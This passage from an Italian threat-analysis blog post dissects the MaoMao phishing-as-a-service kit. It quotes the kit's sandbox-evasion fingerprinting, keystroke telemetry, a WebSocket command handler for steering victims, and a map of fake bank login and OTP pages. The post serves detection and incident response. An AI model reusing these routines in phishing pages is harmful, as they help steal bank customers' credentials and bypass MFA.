---
title: Analisi Tecnica del Kit MaoMao PhaaS: Tattiche AiTM ed Evasione Avanzata
url: https://blog.lobsec.com/2026/09/analisi-tecnica-maomao-phaas/
source: Over Security
date: 2026-09-03
fetch_date: 2026-09-04T06:43:46.393203
---

# Analisi Tecnica del Kit MaoMao PhaaS: Tattiche AiTM ed Evasione Avanzata

[Vai al contenuto](#content "Vai al contenuto")

[LobSec](https://blog.lobsec.com/)

Layered Offensive Barrier of Security

Menu

Menu

* [CV (ITA)](https://blog.lobsec.com/cv-ita/)
* [Privacy policy](https://blog.lobsec.com/privacy-policy/)
* [GPG](https://blog.lobsec.com/gpg/)

# Analisi Tecnica del Kit MaoMao PhaaS: Tattiche AiTM ed Evasione Avanzata

2026-09-03 di [lobst3r](https://blog.lobsec.com/author/lobst3r/ "Visualizza tutti gli articoli di lobst3r")

## TL;DR

L’analisi del codice sorgente client-side di una recente campagna di phishing ha rivelato l’impiego del kit **MaoMao**, una piattaforma avanzata di *Phishing-as-a-Service (PhaaS)*. Il malware opera come reverse proxy in scenari *Adversary-in-the-Middle (AiTM)* per bypassare l’MFA. Utilizza tecniche sofisticate di Canvas/WebGL fingerprinting e behavioral biometrics per evadere le sandbox. L’esfiltrazione dei dati e i comandi di C2 avvengono in tempo reale tramite WebSockets (WSS). In questo articolo dissezioneremo il codice malevolo, fornendo insight operativi e regole YARA per i team di Incident Response.

## Il contesto: Cos’è il kit MaoMao

Negli ultimi anni, il panorama delle minacce si è spostato da rudimentali cloni HTML verso architetture di **Phishing-as-a-Service (PhaaS)** altamente scalabili. Tra questi spicca **MaoMao**, un framework di origine asiatica divenuto celebre nell’underground criminale per la sua spiccata capacità di gestire attacchi **AiTM (Adversary-in-the-Middle)**.

Il successo di MaoMao deriva dalla sua architettura modulare: un “core engine” invisibile gestisce l’esfiltrazione, la telemetria e la persistenza della sessione, mentre l’interfaccia utente è demandata a **Single Page Applications (SPA)** moderne (spesso scritte in Vue.js). Questo permette agli affiliati di cambiare rapidamente il *lure* (l’esca) – passando da finti portali governativi a false pagine di home banking – mantenendo intatto il motore malevolo sottostante, che si occupa del furto in tempo reale dei cookie di sessione per eludere l’autenticazione a più fattori.

Analizziamo ora i moduli chiave estratti dal codice sorgente offuscato.

## 1. Evasione Sandbox: Fingerprinting e Anti-Bot

Una delle priorità di MaoMao è assicurarsi che dall’altra parte ci sia una vittima umana e non uno scanner SOC, un crawler o una sandbox di analisi. Lo fa tramite la funzione `collectRiskFingerprint()`, che calcola un hash dell’ambiente di esecuzione.

Il codice verifica la presenza di framework di automazione (`navigator.webdriver`, stringhe come `HeadlessChrome|PhantomJS`) ed esegue un test di **Canvas Fingerprinting** e **WebGL Fingerprinting**.

```
function collectRiskFingerprint() {
  var fp = {
    canvas_available:true, webgl_available:true,
    // ... [snip] ...
    webdriver:navigator.webdriver === true,
    headless:/HeadlessChrome|PhantomJS/i.test(String(navigator.userAgent || ''))
  };
  try {
    var canvas = document.createElement('canvas');
    canvas.width = 280; canvas.height = 60;
    var ctx = canvas.getContext('2d');
    if (ctx) {
      ctx.textBaseline = 'top'; ctx.font = '16px Arial'; ctx.fillStyle = '#f4511e';
      ctx.fillRect(2, 2, 36, 18); ctx.fillStyle = '#1565c0';
      // FIRMA MAOMAO: Testo renderizzato per generare l'hash del canvas
      ctx.fillText('MaoMao browser 0123456789', 6, 25);
      fp.canvas_hash = riskHash(canvas.toDataURL());
    }
  } catch (_) { fp.canvas_available = false; }
  // ... [snip WebGL fingerprinting] ...
  RISK_FINGERPRINT = fp;
  return fp;
}
```

La stringa `MaoMao browser 0123456789` rappresenta una *signature* statica formidabile per la fase di detection. L’hash risultante viene inviato al C2: se l’hash è noto per appartenere a sandbox di vendor di sicurezza, l’attacco viene interrotto (fornendo magari una pagina benigna 404).

## 2. Behavioral Biometrics: Analisi dell’input utente

Non fidandosi solo del fingerprinting statico, MaoMao implementa una raccolta continua di **telemetria comportamentale**. La funzione `initRiskSignals()` aggancia dei listener al `document` per contare movimenti del mouse, click e, soprattutto, gli intervalli di tempo tra le singole battute sulla tastiera (`input_interval_ms`).

```
var RISK_BEHAVIOR = {
  mouse_moves:0, clicks:0, scrolls:0, inputs:0, key_downs:0, touches:0,
  fast_input_events:0, input_interval_sum:0, input_interval_count:0,
  min_input_interval_ms:0, last_input_at:0, honeypot:false
};

function initRiskSignals() {
  // ... [snip event listeners for mouse and scroll] ...
  add('input', document, function(event){
    var now = Date.now(), elapsed = RISK_BEHAVIOR.last_input_at ? now - RISK_BEHAVIOR.last_input_at : 0;
    RISK_BEHAVIOR.inputs = Math.min(1000000, RISK_BEHAVIOR.inputs + 1);
    if (elapsed > 0) {
      RISK_BEHAVIOR.input_interval_sum += elapsed; RISK_BEHAVIOR.input_interval_count += 1;
      if (!RISK_BEHAVIOR.min_input_interval_ms || elapsed < RISK_BEHAVIOR.min_input_interval_ms) RISK_BEHAVIOR.min_input_interval_ms = elapsed;
      // Rilevamento di script automatici (es. copia-incolla)
      if (elapsed < 20) RISK_BEHAVIOR.fast_input_events += 1;
    }
    RISK_BEHAVIOR.last_input_at = now;
  });
}
```

Se `fast_input_events` risulta troppo alto (come nel caso di un tool di autofill o di uno script Python che inietta testo nei form), il C2 classificherà la sessione come *low-risk/bot* e dropperà la connessione.

## 3. Real-Time C2 Communication (WebSockets)

Nei framework AiTM, il tempismo è tutto. L’attaccante deve inserire le credenziali rubate sul sito legittimo, aspettare che questo richieda un codice OTP, e poi presentare la schermata di richiesta OTP alla vittima. Per orchestrare questa catena, MaoMao stabilisce una connessione **WebSocket Secure (WSS)** persistente.

Tramite la funzione `runCommand(cmd)`, il browser riceve istruzioni live dall’operatore malevolo (o dal backend automatizzato):

```
function runCommand(cmd) {
  if (!cmd || !cmd.type) return;
  ackCommand(cmd.id);
  switch (cmd.type) {
    case 'jump': // Reindirizza la vittima (es. alla pagina OTP)
    case 'approve':
      if (cmd.payload && cmd.payload.pageId) {
        go(cmd.payload.pageId, { adminToken: cmd.payload.admin_flow_token });
      }
      break;
    case 'message': // Invia un messaggio toast (es. "Credenziali Errate")
      unblockAfterHint();
      showHint(cmd.payload && cmd.payload.text || '');
      break;
    case 'reject': // Mostra un overlay di blocco
      showRejectOverlay(cmd.payload && cmd.payload.text || 'Impossibile inviare...');
      break;
    case 'kick': // Uccide la sessione (usato se l'operatore si accorge di un'analisi in corso)
      showEndPage('Session ended');
      break;
  }
}
```

Qualora il WSS fosse bloccato da policy proxy aziendali, il kit implementa un meccanismo di fallback tramite `startPolling()`, effettuando richieste POST periodiche all’endpoint `/api/heartbeat`.

## 4. Architettura SPA e Modularity del Lure

La parte visiva della truffa è gestita da un bundle separato (basato su Vue 3 e Pinia). La flessibilità del framework è testimoniata dal dispatcher degli eventi. Il payload del WSS intercetta le azioni lato server e decide quale “componente” caricare. Nel codice troviamo le mappature in lingua cinese che rivelano il target internazionale del kit:

```
function GF(e) {
  if (!e) return;
  const t = {
    桑坦德APP验证: "/AppStan",        // Santander App Validation
    默认PIN验证: "/OtpPin",          // Default PIN Validation
    BBVA登录页: "/bbvalogin",        // BBVA Login
    BBVA短信页: "/bbvaotp",          // BBVA SMS
    Alpha登录页: "/alpha_login",     // Alpha Bank Login
    Alpha验证码页: "/alpha_otp",     // Alpha Bank OTP
    Alpha邮箱验证码页: "/alpha_email"  // Alpha Bank Email OTP
  };

  // L'evento 'customOtpValid' innesca il rounting dinamico della SPA
  if (e.type === "customOtpValid") {
    const o = t[oe.value.name]; // Mappa il nome del template in cinese alla Route di Vue
    if (o) {
      Ma(o, e); // Esegue il push del router
      return;
    }
  }...